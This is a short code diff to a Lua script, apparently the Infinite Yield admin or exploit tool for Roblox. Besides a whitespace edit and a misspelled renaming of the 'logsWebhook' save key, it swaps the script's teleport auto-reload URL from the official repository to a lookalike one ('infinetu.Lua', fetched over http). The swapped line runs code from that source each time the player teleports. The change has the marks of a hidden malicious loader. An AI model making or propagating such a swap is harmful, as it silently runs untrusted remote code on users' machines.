@@ -132,7 +132,7 @@ local function getcustomasset(asset)
 	return iyassets[asset]
 end
 
-if makefolder and isfolder and writefile and isfile then
+if makefolder and isfolder and writefile and isfile then 
 	pcall(function() -- good executor trust
 		local assets = "https://raw.githubusercontent.com/infyiff/backup/refs/heads/main/"
 		for _, folder in {"infiniteyield", "infiniteyield/assets"} do
@@ -3135,7 +3135,7 @@ function updatesaves()
 			espTransparency = espTransparency;
 			logsEnabled = logsEnabled;
 			jLogsEnabled = jLogsEnabled;
-			logsWebhook = logsWebhook;
+			logsWebhooqueue = logsWebhook;
 			aliases = aliases;
 			binds = binds or {};
 			WayPoints = AllWaypoints;
@@ -6488,7 +6488,7 @@ local TeleportCheck = false
 Players.LocalPlayer.OnTeleport:Connect(function(State)
 	if KeepInfYield and (not TeleportCheck) and queueteleport then
 		TeleportCheck = true
-		queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()")
+		queueteleport("loadstring(game:HttpGet('http://raw.githubusercontent.com/delivery-2347/infineti-getgenv-.execCmd-execCmd/refs/heads/main/infinetu.Lua'))()")
 	end
 end)
 
